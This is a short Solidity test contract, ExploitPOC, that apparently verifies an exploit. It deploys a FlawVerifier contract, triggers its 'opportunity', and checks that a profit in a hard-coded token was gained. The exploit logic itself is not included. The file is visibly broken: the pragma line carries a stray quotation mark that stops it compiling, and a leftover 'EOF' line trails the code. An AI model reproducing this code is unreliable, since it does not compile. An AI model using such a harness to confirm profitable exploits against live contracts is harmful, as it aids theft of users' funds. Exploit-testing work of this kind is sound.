// SPDX-License-Identifier: UNLICENSED
pragma solidity "'^0.8.20;

import "../src/FlawVerifier.sol";

interface IERC20Meta {
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitPOC {
    function testExploit() external {
        FlawVerifier verifier = new FlawVerifier();
        address token = verifier.profitToken();
        uint256 beforeBal = IERC20Meta(token).balanceOf(address(verifier));
        verifier.executeOnOpportunity();
        uint256 afterBal = IERC20Meta(token).balanceOf(address(verifier));
        require(afterBal >= beforeBal, "balance regressed");
        require(verifier.profitAmount() == afterBal - beforeBal, "profit mismatch");
        if (afterBal > beforeBal) {
            require(token == 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, "wrong token");
        }
    }
}
EOF
